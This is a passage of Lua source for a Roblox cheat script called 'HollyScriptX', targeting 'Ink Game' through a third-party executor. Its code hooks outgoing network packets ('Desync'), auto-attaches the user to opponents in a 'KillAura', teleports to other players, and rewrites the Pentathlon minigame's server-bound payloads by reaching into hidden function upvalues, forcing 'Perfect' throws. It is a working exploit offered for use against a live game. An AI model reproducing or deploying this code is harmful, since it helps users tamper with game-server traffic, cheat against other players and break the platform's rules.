        MainModule.Notify("Desync", "Unsupported Executor", 0.9)
        PlayErrorSound()
        if toggleRef and toggleRef.SetValue then
            pcall(function() toggleRef:SetValue(false) end)
        end
        return false
    end
    if enabled then
        if not MainModule.desyncHooked then 
            pcall(function()
                raknet.add_send_hook(MainModule.rakhook)
                MainModule.desyncHooked = true
            end)
        end
    else
        if MainModule.desyncHooked then 
            pcall(function()
                raknet.remove_send_hook(MainModule.rakhook)
                MainModule.desyncHooked = false
            end)
        end
    end
    PlayToggleSound()
    return true
end

MainModule.PlayerAttachEnabled = false
MainModule.attachedTarget = nil
MainModule.attachConnection = nil
MainModule.autoSearchConnection = nil

MainModule.BehindSquare = nil
MainModule.FrontSquare = nil
MainModule.CurrentSquare = nil
MainModule.CurrentBodyVelocity = nil

MainModule.AttachConfig = {
    BehindDistance = 2.5,
    FrontDistance = 16,
    SpeedThreshold = 17,
    MaxSpeed = 500,
    TransitionSpeed = 150,
}

MainModule.createSquare = function(name, offsetDistance)
    local square = Instance.new("Part")
    square.Name = name
    square.Size = Vector3.new(3, 0.5, 3)
    square.Transparency = 1
    square.CanCollide = false
    square.Anchored = true
    square.Massless = true
    square.Parent = workspace
    return square
end

MainModule.destroySquares = function()
    if MainModule.BehindSquare then
        MainModule.BehindSquare:Destroy()
        MainModule.BehindSquare = nil
    end
    if MainModule.FrontSquare then
        MainModule.FrontSquare:Destroy()
        MainModule.FrontSquare = nil
    end
end

MainModule.isTargetMovingForward = function(targetRoot)
    if not targetRoot then return false end
    local targetVel = targetRoot.Velocity
    local horizontalSpeed = math.sqrt(targetVel.X^2 + targetVel.Z^2)
    if horizontalSpeed < 2 then return false end
    local targetLook = targetRoot.CFrame.LookVector
    local moveDir = Vector3.new(targetVel.X, 0, targetVel.Z).Unit
    local lookDir = Vector3.new(targetLook.X, 0, targetLook.Z).Unit
    return lookDir:Dot(moveDir) > 0.7
end

MainModule.updateSquares = function(targetRoot)
    if not targetRoot then return end
    local targetPos = targetRoot.Position
    local targetLook = targetRoot.CFrame.LookVector
    local targetHeight = targetRoot.Position.Y
    
    local behindPos = targetPos + (-targetLook * MainModule.AttachConfig.BehindDistance)
    behindPos = Vector3.new(behindPos.X, targetHeight - 2, behindPos.Z)
    
    local frontPos = targetPos + (targetLook * MainModule.AttachConfig.FrontDistance)
    frontPos = Vector3.new(frontPos.X, targetHeight - 2, frontPos.Z)
    
    if MainModule.BehindSquare then MainModule.BehindSquare.Position = behindPos end
    if MainModule.FrontSquare then MainModule.FrontSquare.Position = frontPos end
end

MainModule.getTargetSquare = function(targetRoot)
    if not targetRoot then return MainModule.BehindSquare end
    local targetVel = targetRoot.Velocity
    local horizontalSpeed = math.sqrt(targetVel.X^2 + targetVel.Z^2)
    local isFast = horizontalSpeed > MainModule.AttachConfig.SpeedThreshold
    local isMovingForward = MainModule.isTargetMovingForward(targetRoot)
    
    if isFast and isMovingForward then
        return MainModule.FrontSquare
    else
        return MainModule.BehindSquare
    end
end

MainModule.applySmoothMovement = function(targetPos, isTransition)
    local myChar = LocalPlayer.Character
    if not myChar then return end
    
    local myRoot = myChar:FindFirstChild("HumanoidRootPart")
    local myHum = myChar:FindFirstChildOfClass("Humanoid")
    
    if not myRoot or not myHum then return end
    
    if not targetPos then return end
    
    local currentPos = myRoot.Position
    local distance = (targetPos - currentPos).Magnitude
    
    if distance > 0.3 then
        local direction = (targetPos - currentPos).Unit
        local speed = isTransition and MainModule.AttachConfig.TransitionSpeed or MainModule.AttachConfig.MaxSpeed
        local moveVector = direction * math.min(speed, distance * 10)
        
        if MainModule.CurrentBodyVelocity then
            MainModule.CurrentBodyVelocity:Destroy()
        end
        
        MainModule.CurrentBodyVelocity = Instance.new("BodyVelocity")
        MainModule.CurrentBodyVelocity.MaxForce = Vector3.new(50000, 0, 50000)
        MainModule.CurrentBodyVelocity.Velocity = Vector3.new(moveVector.X, 0, moveVector.Z)
        MainModule.CurrentBodyVelocity.Parent = myRoot
        
        task.wait(0.03)
        
        if MainModule.CurrentBodyVelocity then
            MainModule.CurrentBodyVelocity:Destroy()
            MainModule.CurrentBodyVelocity = nil
        end
    end
    
    myHum.AutoRotate = true
end

MainModule.FindBestTarget = function()
    local localPlayer = LocalPlayer
    if not localPlayer then return nil end
    
    local isSeeker = MainModule.IsSeeker(localPlayer)
    local isHider = MainModule.IsHider(localPlayer)
    
    local myChar = LocalPlayer.Character
    if not myChar then return nil end
    
    local myRoot = myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return nil end
    
    local bestTarget = nil
    local bestDistance = math.huge
    
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if humanoid and humanoid.Health > 0 then
                
                local valid = false
                if isSeeker and MainModule.IsHider(player) then
                    valid = true
                elseif isHider and MainModule.IsSeeker(player) then
                    valid = true
                elseif not isSeeker and not isHider then
                    valid = true
                end
                
                if valid then
                    local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                    if targetRoot then
                        local dist = (targetRoot.Position - myRoot.Position).Magnitude
                        if dist < bestDistance then
                            bestDistance = dist
                            bestTarget = player
                        end
                    end
                end
            end
        end
    end
    
    return bestTarget
end

MainModule.lastSquare = nil

MainModule.attachToPlayer = function(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return false end
    if MainModule.attachedTarget == targetPlayer then return true end
    
    if MainModule.attachedTarget then MainModule.detach() end
    
    local myChar = LocalPlayer.Character
    if not myChar then return false end
    
    local myRoot = myChar:FindFirstChild("HumanoidRootPart")
    local myHum = myChar:FindFirstChildOfClass("Humanoid")
    if not myRoot or not myHum then return false end
    
    MainModule.destroySquares()
    MainModule.BehindSquare = MainModule.createSquare("BehindSquare", MainModule.AttachConfig.BehindDistance)
    MainModule.FrontSquare = MainModule.createSquare("FrontSquare", MainModule.AttachConfig.FrontDistance)
    
    MainModule.attachedTarget = targetPlayer
    MainModule.lastSquare = nil
    
    myHum.WalkSpeed = MainModule.AttachConfig.MaxSpeed
    myHum.AutoRotate = true
    myHum.PlatformStand = false
    
    if not MainModule.FaceTargetModule.Enabled then
        MainModule.ToggleFaceTarget(true)
        if ToggleRefs.FaceTarget then ToggleRefs.FaceTarget:SetValue(true) end
    end
    
    if MainModule.attachConnection then MainModule.attachConnection:Disconnect() end
    
    MainModule.attachConnection = RunService.Heartbeat:Connect(function()
        if not MainModule.PlayerAttachEnabled or not MainModule.attachedTarget then 
            MainModule.detach()
            return 
        end
        
        if not MainModule.attachedTarget or not MainModule.attachedTarget.Character then 
            MainModule.detach()
            return 
        end
        
        local targetChar = MainModule.attachedTarget.Character
        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
        local targetHum = targetChar:FindFirstChildOfClass("Humanoid")
        
        if not targetRoot or not targetHum or targetHum.Health <= 0 then
            local newTarget = MainModule.FindBestTarget()
            if newTarget and newTarget ~= MainModule.attachedTarget then
                MainModule.attachToPlayer(newTarget)
                PlayDeathSound()
            else
                MainModule.detach()
                MainModule.Notify("KillAura", "No new target's found :c", 0.9)
                PlayErrorSound()
                if ToggleRefs.PlayerAttach then ToggleRefs.PlayerAttach:SetValue(false) end
            end
            return
        end
        
        MainModule.updateSquares(targetRoot)
        
        local targetSquare = MainModule.getTargetSquare(targetRoot)
        if targetSquare then
            local isChangingSquare = (MainModule.lastSquare ~= nil and MainModule.lastSquare ~= targetSquare)
            local targetPos = targetSquare.Position
            local targetHeightPos = Vector3.new(targetPos.X, targetPos.Y + 2.5, targetPos.Z)
            MainModule.applySmoothMovement(targetHeightPos, isChangingSquare)
            MainModule.lastSquare = targetSquare
        end
    end)
    
    return true
end

MainModule.detach = function()
    if MainModule.attachConnection then 
        MainModule.attachConnection:Disconnect() 
        MainModule.attachConnection = nil 
    end
    
    if MainModule.CurrentBodyVelocity then
        MainModule.CurrentBodyVelocity:Destroy()
        MainModule.CurrentBodyVelocity = nil
    end
    
    MainModule.destroySquares()
    
    local myChar = LocalPlayer.Character
    if myChar then
        local myHum = myChar:FindFirstChildOfClass("Humanoid")
        if myHum then
            myHum.PlatformStand = false
            myHum.AutoRotate = true
            myHum.WalkSpeed = 16
        end
        
        local myRoot = myChar:FindFirstChild("HumanoidRootPart")
        if myRoot then
            myRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        end
    end
    
    if MainModule.FaceTargetModule.Enabled then
        MainModule.ToggleFaceTarget(false)
        if ToggleRefs.FaceTarget then ToggleRefs.FaceTarget:SetValue(false) end
    end
    
    MainModule.attachedTarget = nil
    MainModule.CurrentSquare = nil
    MainModule.lastSquare = nil
end

MainModule.startAutoSearch = function()
    if MainModule.autoSearchConnection then MainModule.autoSearchConnection:Disconnect() end
    
    MainModule.autoSearchConnection = RunService.Heartbeat:Connect(function()
        if not MainModule.PlayerAttachEnabled then return end
        if MainModule.attachedTarget then return end
        
        if tick() % 1 < 0.05 then
            local bestTarget = MainModule.FindBestTarget()
            if bestTarget then
                MainModule.attachToPlayer(bestTarget)
                PlayBell()
            end
        end
    end)
end

MainModule.TogglePlayerAttach = function(enabled)
    MainModule.PlayerAttachEnabled = enabled
    
    if enabled then
        local bestTarget = MainModule.FindBestTarget()
        
        if bestTarget then 
            MainModule.attachToPlayer(bestTarget)
            PlayBell()
            MainModule.startAutoSearch()
        else 
            MainModule.Notify("Killaura", "No player's found :c", 0.9)
            PlayErrorSound()
            MainModule.PlayerAttachEnabled = false
            if ToggleRefs.PlayerAttach then ToggleRefs.PlayerAttach:SetValue(false) end
        end
    else
        if MainModule.autoSearchConnection then 
            MainModule.autoSearchConnection:Disconnect() 
            MainModule.autoSearchConnection = nil 
        end
        MainModule.detach()
    end
    PlayToggleSound()
end

MainModule.SpectatePlayer = function(player)
    if not player then return end
    if not player.Character then
        MainModule.Notify("Spectate", "Player has no character", 0.9)
        PlayErrorSound()
        return
    end
    local hum = player.Character:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 then
        Library:Notify({Title = "Spectate", Description = "Player is dead", Duration = 0.9})
        PlayErrorSound()
        return
    end
    workspace.CurrentCamera.CameraSubject = hum
    Library:Notify({Title = "Spectate", Description = "Spectating: " .. player.Name, Duration = 0.9})
    PlayBell()
end

MainModule.StopSpectate = function()
    local char = LocalPlayer.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            workspace.CurrentCamera.CameraSubject = hum
            Library:Notify({Title = "Spectate", Description = "Stopped", Duration = 0.9})
            PlayBell()
        end
    end
end

MainModule.TeleportToPlayer = function(player)
    if not player then return end
    if not player.Character then
        Library:Notify({Title = "Teleport", Description = "Player has no character", Duration = 0.9})
        PlayErrorSound()
        return
    end
    local root = player.Character:FindFirstChild("HumanoidRootPart")
    if not root then
        Library:Notify({Title = "Teleport", Description = "Player has no root part", Duration = 0.9})
        PlayErrorSound()
        return
    end
    local myChar = LocalPlayer.Character
    if not myChar then return end
    local myRoot = myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return end
    myRoot.CFrame = CFrame.new(root.Position + Vector3.new(0, 3, 0))
    Library:Notify({Title = "Teleport", Description = "Teleported to: " .. player.Name, Duration = 0.9})
    PlayBell()
end

MainModule.getNearestPlayerAnywhere = function()
    local nearest = nil
    local shortest = math.huge
    local myChar = MainModule.GetCharacter()
    if not myChar then return nil end
    local myPos = myChar:FindFirstChild("HumanoidRootPart") and myChar.HumanoidRootPart.Position
    if not myPos then return nil end
    for _,p in pairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and p.Character then
            local rp = p.Character:FindFirstChild("HumanoidRootPart")
            if rp then
                local d = (rp.Position - myPos).Magnitude
                if d < shortest then shortest = d; nearest = p end
            end
        end
    end
    return nearest
end

MainModule.teleportToNearest = function()
    local nearest = MainModule.getNearestPlayerAnywhere()
    if nearest and nearest.Character then
        local root = nearest.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local myChar = LocalPlayer.Character
            if myChar then
                local myRoot = myChar:FindFirstChild("HumanoidRootPart")
                if myRoot then
                    myRoot.CFrame = CFrame.new(root.Position + Vector3.new(0, 3, 0))
                    MainModule.Notify("Teleport", "Teleported to: " .. nearest.Name, 0.9)
                    PlayBell()
                end
            end
        end
    else
        Library:Notify({Title = "Teleport", Description = "No player's near :c", Duration = 0.9})
        PlayErrorSound()
    end
end

MainModule.UpdateAllTogglesByGame = function()
    local values = Workspace:FindFirstChild("Values")
    if not values then return end
    local currentGame = values:FindFirstChild("CurrentGame")
    local gameName = currentGame and currentGame.Value
    
    MainModule.UpdateToggleAvailability("AutoDodge", gameName == "HideAndSeek" and "HideAndSeek" or nil, ToggleRefs.AutoDodge)
    MainModule.UpdateToggleAvailability("InfiniteStamina", gameName == "HideAndSeek" and "HideAndSeek" or nil, ToggleRefs.InfiniteStamina)
    MainModule.UpdateToggleAvailability("SpikesKill", gameName == "HideAndSeek" and "HideAndSeek" or nil, ToggleRefs.SpikesKill)
    MainModule.UpdateToggleAvailability("AutoEscape", gameName == "HideAndSeek" and "HideAndSeek" or nil, ToggleRefs.AutoEscape)
    MainModule.UpdateToggleAvailability("KeyESP", gameName == "HideAndSeek" and "HideAndSeek" or nil, ToggleRefs.KeyESP)
    MainModule.UpdateToggleAvailability("JumpRopeAntiFall", gameName == "JumpRope" and "JumpRope" or nil, ToggleRefs.JumpRopeAntiFall)
    MainModule.UpdateToggleAvailability("GlassESP", gameName == "GlassBridge" and "GlassBridge" or nil, ToggleRefs.GlassESP)
    MainModule.UpdateToggleAvailability("AntiBreak", gameName == "GlassBridge" and "GlassBridge" or nil, ToggleRefs.AntiBreak)
    MainModule.UpdateToggleAvailability("ZoneKill", gameName == "LastDinner" and "LastDinner" or nil, ToggleRefs.ZoneKill)
    MainModule.UpdateToggleAvailability("VoidKill", gameName == "SkySquidGame" and "SkySquidGame" or nil, ToggleRefs.VoidKill)
    MainModule.UpdateToggleAvailability("SkySquidAntiFall", gameName == "SkySquidGame" and "SkySquidGame" or nil, ToggleRefs.SkySquidAntiFall)
    MainModule.UpdateToggleAvailability("MingleVoidKill", gameName == "Mingle" and "Mingle" or nil, ToggleRefs.MingleVoidKill)
    MainModule.UpdateToggleAvailability("GodMode", gameName == "RedLightGreenLight" and "RedLightGreenLight" or nil, ToggleRefs.GodMode)
    MainModule.UpdateToggleAvailability("RemoveInjury", gameName == "RedLightGreenLight" and "RedLightGreenLight" or nil, ToggleRefs.RemoveInjury)
    MainModule.UpdateToggleAvailability("AutoChoke", gameName == "Mingle" and "Mingle" or nil, ToggleRefs.AutoChoke)
    MainModule.UpdateToggleAvailability("AutoPickupKeys", gameName == "HideAndSeek" and "HideAndSeek" or nil, ToggleRefs.AutoPickup)
end

MainModule.GameStateMonitor = {
    Connection = nil,
    LastGame = nil
}

MainModule.GameStateMonitor.Start = function()
    if MainModule.GameStateMonitor.Connection then MainModule.GameStateMonitor.Connection:Disconnect() end
    
    MainModule.GameStateMonitor.Connection = RunService.Heartbeat:Connect(function()
        local values = Workspace:FindFirstChild("Values")
        if not values then return end
        local currentGame = values:FindFirstChild("CurrentGame")
        local gameName = currentGame and currentGame.Value
        
        if gameName ~= MainModule.GameStateMonitor.LastGame then
            if MainModule.GameStateMonitor.LastGame then
                MainModule.GameStateMonitor.DisableGameToggles(MainModule.GameStateMonitor.LastGame)
            end
            MainModule.GameStateMonitor.LastGame = gameName
            MainModule.UpdateAllTogglesByGame()
        end
    end)
end

MainModule.GameStateMonitor.DisableGameToggles = function(gameName)
    local toggles = {
        HideAndSeek = {"AutoDodge", "InfiniteStamina", "SpikesKill", "AutoEscape", "KeyESP", "AutoPickupKeys"},
        JumpRope = {"JumpRopeAntiFall"},
        GlassBridge = {"GlassESP", "AntiBreak"},
        LastDinner = {"ZoneKill"},
        SkySquidGame = {"VoidKill", "SkySquidAntiFall"},
        Mingle = {"MingleVoidKill", "AutoChoke"},
        RedLightGreenLight = {"GodMode", "RemoveInjury"}
    }
    
    local gameToggles = toggles[gameName]
    if gameToggles then
        for _, toggleName in ipairs(gameToggles) do
            MainModule.DisableToggle(toggleName)
        end
    end
end

MainModule.GameStateMonitor.Start()

local Window = Library:CreateWindow({
    Title = "HollyScriptX",
    Center = true,
    Footer = "discord.gg/PufsSPGK2x | Ink Game (by @t3e6)",
    Resizable = true,
    AutoShow = true,
    ShowCustomCursor = false,
    ToggleKeybind = Enum.KeyCode.Z,
    CornerRadius = 20
})

Library:SetDPIScale(100)

guiCreated = true



for _, notif in ipairs(pendingNotifications) do
    Library:Notify({Title = notif.title, Description = notif.text, Duration = notif.duration})
end
pendingNotifications = {}

if MainModule.IsMobile() then
    Library:SetDPIScale(85)
end


local GamesTab = Window:AddTab("Games", "candy-cane")
local PlayersTab = Window:AddTab("Players", "info")
local GuardsTab = Window:AddTab("Guards", "shield")
local MainTab = Window:AddTab("Main", "warehouse")
local assgarbage = Window:AddTab("Extras", "sparkles")

local RLGLGroup = GamesTab:AddLeftGroupbox("Red Light Green Light", "lightbulb-off")
local DalgonaGroup = GamesTab:AddRightGroupbox("Dalgona & Pentathlon", "gamepad")
local HNSLeft = GamesTab:AddLeftGroupbox("Hide And Seek", "eye-closed")
local TugLeft = GamesTab:AddLeftGroupbox("Tug Of War", "swords")
local JumpLeft = GamesTab:AddLeftGroupbox("Jump Rope", "arrow-up")
local GlassLeft = GamesTab:AddLeftGroupbox("Glass Bridge", "circuit-board")
local MingleGroup = GamesTab:AddRightGroupbox("Mingle", "users")
local DinnerGroup = GamesTab:AddRightGroupbox("Last Dinner", "utensils")
local SquidLeft = GamesTab:AddRightGroupbox("Sky Squid", "cloud")
local RebelGroup = GamesTab:AddRightGroupbox("Rebel", "flag")

RLGLGroup:AddButton("Remove Injury", MainModule.RemoveInjuryObjects, {Tooltip = "Destroys crawling and Stun"})
RLGLGroup:AddButton("Teleport to End", MainModule.RLGL_TP_End, {Tooltip = "Teleports you to the end of Red Light Green Light"})
ToggleRefs.GodMode = RLGLGroup:AddToggle("GodMode", {Text="God Mode", Default=false, Callback=MainModule.ToggleGodMode, Tooltip = "Teleports you high up to avoid being shooted by bullets"})
ToggleRefs.RLGLStop = RLGLGroup:AddToggle("RLGLStop", {
    Text = "Auto Stop on Red Light",
    Default = false,
    Callback = MainModule.ToggleRLGLStop,
    Tooltip = "Automatically freezes your character when Red Light is active to avoid getting shot, and unfreezes when Green Light is active"
})
ToggleRefs.FreeLighter = DalgonaGroup:AddToggle("FreeLighter", {
    Text = "Free Lighter",
    Default = false,
    Callback = MainModule.Dalgona_Lighter,
    Tooltip = "Gives you a lighter for the Dalgona game"
})
DalgonaGroup:AddButton("Anti Crack", MainModule.AntiCrack, {
    Tooltip = "Removes cracks from the Dalgona shape"
})
ToggleRefs.AutoDalgona = DalgonaGroup:AddToggle("AutoDalgona", {
    Text = "Auto Dalgona V2", 
    Default = false, 
    Callback = MainModule.ToggleAutoDalgona,
    Tooltip = "You just needs press on dalgona outline"
})
DalgonaGroup:AddButton("Complete Dalgona Shape", function()
    MainModule.DalgonaCompleteShape()
end, {Tooltip = "Completes the Dalgona shape"})
DalgonaGroup:AddDivider()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local PentathlonModule = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Games"):WaitForChild("PentathlonClient")
local PentathlonClient = require(PentathlonModule)

local TargetTable = nil

local function hookTarget(tbl)
    if rawget(tbl, "RunServerGame") and type(tbl.RunServerGame) == "function" and not tbl._hooked then
        tbl._hooked = true
        TargetTable = tbl

        local originalRun = tbl.RunServerGame

        tbl.RunServerGame = function(self, eventName, payload)
            if type(payload) ~= "table" then payload = {}
            end

            if eventName == "Thrown" and payload.Power ~= nil then
                payload.Power = 1
            end

            if eventName == "Thrown" and payload.ThrowPower ~= nil then
                payload.ThrowPower = "Perfect"
                if self and self.Stand and self.Stand:FindFirstChild("Target") then
                    local origin = payload.Origin or workspace.CurrentCamera.CFrame.Position
                    local targetPos = self.Stand.Target.Position
                    payload.Direction = (targetPos - origin).Unit
                end
            end

            return originalRun(self, eventName, payload)
        end
        return true
    end
    return false
end

local function scanAndInject()
    local visited = {}
    local function searchUpvalues(fn)
        if type(fn) ~= "function" or visited[fn] then return false end
        visited[fn] = true
        if iscclosure and iscclosure(fn) then return false end

        local success, upvalues = pcall(debug.getupvalues, fn)
        if not success or type(upvalues) ~= "table" then return false end

        for _, upvalue in pairs(upvalues) do
            if type(upvalue) == "table" then
                if hookTarget(upvalue) then return true end
                for _, subVal in pairs(upvalue) do
                    if type(subVal) == "function" and searchUpvalues(subVal) then
                        return true
                    end
                end
            elseif type(upvalue) == "function" then
                if searchUpvalues(upvalue) then return true end
            end
        end
        return false
    end

    for _, v in pairs(PentathlonClient) do
        if type(v) == "function" and searchUpvalues(v) then
            return true
        end
    end
    return false
end

task.spawn(function()
    while task.wait(0.3) do
        scanAndInject()
    end
end)

function MainModule.MaxDdakjiStrength()
    local function injectDdakji()
        local visited = {}
        local function searchUpvalues(fn)
            if type(fn) ~= "function" or visited[fn] then return false end
            visited[fn] = true
            if iscclosure and iscclosure(fn) then return false end

            local success, upvalues = pcall(debug.getupvalues, fn)
            if not success or type(upvalues) ~= "table" then return false end

            for _, upvalue in pairs(upvalues) do
                if type(upvalue) == "table" then
                    if rawget(upvalue, "RunServerGame") and type(upvalue.RunServerGame) == "function" and not upvalue._ddakji_hooked then
                        upvalue._ddakji_hooked = true
                        local originalRun = upvalue.RunServerGame
                        upvalue.RunServerGame = function(self, eventName, payload)
                            if type(payload) ~= "table" then 
                                payload = {}
                            end
                            if eventName == "Thrown" and payload.Power ~= nil then
                                payload.Power = 1
                            end
                            return originalRun(self, eventName, payload)
                        end
                        return true
                    end
                    for _, subVal in pairs(upvalue) do
                        if type(subVal) == "function" and searchUpvalues(subVal) then
                            return true
                        end
                    end
                elseif type(upvalue) == "function" then
                    if searchUpvalues(upvalue) then return true end
                end
            end
            return false
        end

        for _, v in pairs(PentathlonClient) do
            if type(v) == "function" and searchUpvalues(v) then
                return true
            end
        end
        return false
    end
    MainModule.Notify("Pentathlon", "Max Ddakji Strength Enabled", 0.9)
    PlayToggleSound()
end

function MainModule.PerfectStoneHit()
    local function injectStone()
        local visited = {}
        local function searchUpvalues(fn)
            if type(fn) ~= "function" or visited[fn] then return false end
            visited[fn] = true
            if iscclosure and iscclosure(fn) then return false end

            local success, upvalues = pcall(debug.getupvalues, fn)
            if not success or type(upvalues) ~= "table" then return false end

            for _, upvalue in pairs(upvalues) do
                if type(upvalue) == "table" then
                    if rawget(upvalue, "RunServerGame") and type(upvalue.RunServerGame) == "function" and not upvalue._stone_hooked then
                        upvalue._stone_hooked = true
                        local originalRun = upvalue.RunServerGame
                        upvalue.RunServerGame = function(self, eventName, payload)
                            if type(payload) ~= "table" then 
                                payload = {}
                            end
                            if eventName == "Thrown" and payload.ThrowPower ~= nil then
                                payload.ThrowPower = "Perfect"
                                if self and self.Stand and self.Stand:FindFirstChild("Target") then
                                    local origin = payload.Origin or workspace.CurrentCamera.CFrame.Position
                                    local targetPos = self.Stand.Target.Position
                                    payload.Direction = (targetPos - origin).Unit
                                end
                            end
                            return originalRun(self, eventName, payload)
                        end
                        return true
                    end
                    for _, subVal in pairs(upvalue) do
                        if type(subVal) == "function" and searchUpvalues(subVal) then
                            return true
                        end
                    end
                elseif type(upvalue) == "function" then
                    if searchUpvalues(upvalue) then return true end
                end
            end
            return false
        end

        for _, v in pairs(PentathlonClient) do
            if type(v) == "function" and searchUpvalues(v) then
                return true
            end
        end
        return false
    end
    MainModule.Notify("Pentathlon", "Perfect Stone Hit Enabled", 0.9)
    PlayToggleSound()
end

MainModule.AutoGonggi = {
    Enabled = false,
    CheckInterval = 0.05,
    StoneCheckInterval = 0.5,
    LastProcessedImage = nil,
    IsProcessingQTE = false,
    ProcessingStones = false,
    QTEThread = nil,
    StoneThread = nil,
    Connection = nil
}

local function getGonggiUI()
    local player = game:GetService("Players").LocalPlayer
    if not player then return nil end
    
    local playerGui = player:FindFirstChild("PlayerGui")
    if not playerGui then return nil end
    
    local ui = playerGui:FindFirstChild("Gonggi")
    if not ui and playerGui:FindFirstChild("OtherUIHolder") then
        ui = playerGui.OtherUIHolder:FindFirstChild("Gonggi")
    end
    
    return ui
end

local function processGonggiQTE()
    if MainModule.AutoGonggi.IsProcessingQTE then return end
    
    MainModule.AutoGonggi.IsProcessingQTE = true
    
    local ui = getGonggiUI()
    if not ui then 
        MainModule.AutoGonggi.IsProcessingQTE = false
        return 
    end
    
    local qteScreen = ui:FindFirstChild("QTEScreen")
    if not qteScreen or not qteScreen.Visible then
        MainModule.AutoGonggi.LastProcessedImage = nil
        MainModule.AutoGonggi.IsProcessingQTE = false
        return
    end
    
    local container = qteScreen:FindFirstChild("MainBar")
    container = container and container:FindFirstChild("ButtonContents")
    container = container and container:FindFirstChild("Inner")
    
    local mobileButtons = ui:FindFirstChild("MobileButtons")
    
    if not container or not mobileButtons then
        MainModule.AutoGonggi.LastProcessedImage = nil
        MainModule.AutoGonggi.IsProcessingQTE = false
        return
    end
    
    local foundActive = false
    
    for _, img in pairs(container:GetChildren()) do
        if img:IsA("ImageLabel") and img.ImageTransparency < 0.1 then
            foundActive = true
            
            if img ~= MainModule.AutoGonggi.LastProcessedImage then
                MainModule.AutoGonggi.LastProcessedImage = img
                
                local inputType = img:GetAttribute("InputType")
                if inputType then
                    local btnName = tostring(inputType)
                    local btn = mobileButtons:FindFirstChild(btnName)
                    
                    if btn then
                        if getconnections then
                            for _, conn in pairs(getconnections(btn.MouseButton1Click)) do
                                conn:Fire()
                            end
                        elseif firesignal then
                            firesignal(btn.MouseButton1Click)
                        else
                            btn:Fire("MouseButton1Click")
                        end
                        
                        task.wait(0.1)
                    end
                end
            end
            break
        end
    end
    
    if not foundActive then
        MainModule.AutoGonggi.LastProcessedImage = nil
    end
    
    MainModule.AutoGonggi.IsProcessingQTE = false
end

local function processGonggiStones()
    if MainModule.AutoGonggi.ProcessingStones then return end
    MainModule.AutoGonggi.ProcessingStones = true
    
    local pentathlonMap = workspace:FindFirstChild("PentathlonMap")
    if not pentathlonMap then 
        MainModule.AutoGonggi.ProcessingStones = false
        return 
    end
    
    local stoneNames = {"Stone1", "Stone2", "Stone3", "Stone4", "Stone5", 
                       "GonggiStone1", "GonggiStone2", "GonggiStone3", "GonggiStone4", "GonggiStone5"}
    
    for _, stoneName in ipairs(stoneNames) do
        local stone = pentathlonMap:FindFirstChild(stoneName, true)
        if stone and stone:IsA("BasePart") then
            if not stone.Anchored then
                stone.Anchored = true
            end
            
            if stone.CanCollide then
                stone.CanCollide = false
            end
            
            if not stone:FindFirstChild("AutoHighlight") then
                local highlight = Instance.new("Highlight")
                highlight.Name = "AutoHighlight"
                highlight.FillColor = Color3.new(0, 1, 0)
                highlight.OutlineColor = Color3.new(0, 0.8, 0)
                highlight.FillTransparency = 0.7
                highlight.Parent = stone
            end
        end
    end
    
    local collectionService = game:GetService("CollectionService")
    local stones = collectionService:GetTagged("GonggiStone")
    
    for _, stone in ipairs(stones) do
        if stone:IsA("BasePart") then
            if not stone.Anchored then
                stone.Anchored = true
            end
            
            if stone.CanCollide then
                stone.CanCollide = false
            end
            
            if not stone:FindFirstChild("AutoHighlight") then
                local highlight = Instance.new("Highlight")
                highlight.Name = "AutoHighlight"
                highlight.FillColor = Color3.new(0, 1, 0)
                highlight.OutlineColor = Color3.new(0, 0.8, 0)
                highlight.FillTransparency = 0.7
                highlight.Parent = stone
            end
        end
    end
    
    MainModule.AutoGonggi.ProcessingStones = false
end

function MainModule.ToggleAutoGonggi(enabled)
    if not MainModule.IsGameActive("Pentathlon") then
        PlayErrorSound()
        if MainModule.AutoGonggi.Enabled then
            MainModule.ToggleAutoGonggi(false)
        end
        return false
    end
    
    if MainModule.AutoGonggi.Enabled == enabled then
        return MainModule.AutoGonggi.Enabled
    end
    
    if MainModule.AutoGonggi.QTEThread then
        task.cancel(MainModule.AutoGonggi.QTEThread)
        MainModule.AutoGonggi.QTEThread = nil
    end
    
    if MainModule.AutoGonggi.StoneThread then
        task.cancel(MainModule.AutoGonggi.StoneThread)
        MainModule.AutoGonggi.StoneThread = nil
    end
    
    MainModule.AutoGonggi.LastProcessedImage = nil
    MainModule.AutoGonggi.IsProcessingQTE = false
    MainModule.AutoGonggi.ProcessingStones = false
    
    MainModule.AutoGonggi.Enabled = enabled
    
    if MainModule.AutoGonggi.Connection then
        MainModule.AutoGonggi.Connection:Disconnect()
        MainModule.AutoGonggi.Connection = nil
    end
    
    if enabled then
        MainModule.AutoGonggi.QTEThread = task.spawn(function()
            while MainModule.AutoGonggi.Enabled do
                if not MainModule.IsGameActive("Pentathlon") then
                    MainModule.AutoGonggi.Enabled = false
                    if MainModule.AutoGonggi.QTEThread then
                        task.cancel(MainModule.AutoGonggi.QTEThread)
                        MainModule.AutoGonggi.QTEThread = nil
                    end
                    if MainModule.AutoGonggi.StoneThread then
                        task.cancel(MainModule.AutoGonggi.StoneThread)
                        MainModule.AutoGonggi.StoneThread = nil
                    end
                    MainModule.Notify("AutoGonggi", "Pentathlon ended - Disabled", 0.9)
                    PlayErrorSound()
                    return
                end
                
                processGonggiQTE()
                task.wait(MainModule.AutoGonggi.CheckInterval)
            end
        end)
        
        MainModule.AutoGonggi.StoneThread = task.spawn(function()
            while MainModule.AutoGonggi.Enabled do
                if not MainModule.IsGameActive("Pentathlon") then
                    MainModule.AutoGonggi.Enabled = false
                    return
                end
                
                processGonggiStones()
                task.wait(MainModule.AutoGonggi.StoneCheckInterval)
            end
        end)
        
        MainModule.AutoGonggi.Connection = RunService.Heartbeat:Connect(function()
            if MainModule.AutoGonggi.Enabled and not MainModule.IsGameActive("Pentathlon") then
